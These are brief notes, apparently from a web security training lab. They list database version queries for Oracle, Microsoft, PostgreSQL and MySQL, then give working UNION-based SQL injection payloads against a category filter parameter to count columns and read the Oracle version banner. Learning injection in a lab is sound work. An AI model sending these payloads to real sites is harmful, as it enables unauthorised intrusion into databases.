Oracle
`SELECT banner FROM v$version  
SELECT version FROM v$instance  
`
Microsoft
`SELECT @@version`
PostgreSQL
`SELECT version()`
MySQL
`SELECT @@version`



with a union based sql injection first step is to determine number of columns- from the lab prompt we can assume two but:
 'ORDER BY 2--
 
/filter?category=Pets' ORDER BY 2--

category=Pets' UNION SELECT 'a',NULL FROM dual--

'UNION SELECT BANNER, NULL FROM v$version--

